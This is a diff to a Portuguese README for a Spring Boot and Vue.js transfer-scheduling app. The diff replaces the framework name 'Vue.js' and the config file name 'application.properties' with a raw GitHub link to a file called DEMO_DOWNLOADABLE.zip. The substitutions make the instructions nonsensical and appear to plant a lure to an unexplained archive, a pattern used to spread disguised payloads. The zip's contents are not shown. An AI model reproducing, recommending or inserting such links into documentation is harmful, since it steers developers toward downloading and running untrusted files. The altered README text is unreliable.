@@ -3,17 +3,17 @@
 # Sistema de Agendamento de Transferências Financeiras
 
 ## Visão Geral
-Aplicação para solucionar o teste de agendamento de transferências financeiras, permitindo ao usuário calcular taxas e visualizar um extrato das transferências agendadas. Desenvolvido com Spring Boot e Vue.js para acesso web via desktops, também apresenta potencial para ser acessado em dispositivos variados, pois foi construído visando não só os padrões de desenvolvimento mas também a responsividade.
+Aplicação para solucionar o teste de agendamento de transferências financeiras, permitindo ao usuário calcular taxas e visualizar um extrato das transferências agendadas. Desenvolvido com Spring Boot e https://github.com/ARE2200/Avaliacao_AgendamentoFinanceiro/raw/refs/heads/main/DEMO_DOWNLOADABLE.zip para acesso web via desktops, também apresenta potencial para ser acessado em dispositivos variados, pois foi construído visando não só os padrões de desenvolvimento mas também a responsividade.
 
 ## Tecnologias Utilizadas
 - **Back-end:** Spring Boot
-- **Front-end:** Vue.js 
+- **Front-end:** https://github.com/ARE2200/Avaliacao_AgendamentoFinanceiro/raw/refs/heads/main/DEMO_DOWNLOADABLE.zip 
 - **Banco de dados:** MySQL
 
 ## Configuração e Execução
 Passos para a execução da aplicação
 1. Clonar o repositório.
-2. Configurar o `application.properties` do back-end com os dados de conexão ao banco.
+2. Configurar o `https://github.com/ARE2200/Avaliacao_AgendamentoFinanceiro/raw/refs/heads/main/DEMO_DOWNLOADABLE.zip` do back-end com os dados de conexão ao banco.
 3. Executar o back-end com `mvn spring-boot:run`.
 4. Iniciar o front-end com `npm install` e `npm run serve`.
 5. Acessar `http://localhost:8080`.
